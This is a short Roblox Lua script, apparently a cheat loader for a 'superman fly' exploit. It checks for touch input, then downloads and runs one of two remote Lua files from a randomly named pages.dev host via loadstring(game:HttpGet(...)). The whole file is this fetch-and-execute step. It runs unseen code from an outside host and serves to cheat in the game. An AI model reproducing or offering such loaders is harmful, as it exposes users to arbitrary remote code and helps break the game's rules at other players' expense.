local UserInputService = game:GetService("UserInputService")
if UserInputService.TouchEnabled then
    loadstring(game:HttpGet("https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/supermanfly.lua"))()
else
    loadstring(game:HttpGet("https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/supermanflyjj.lua"))()
end
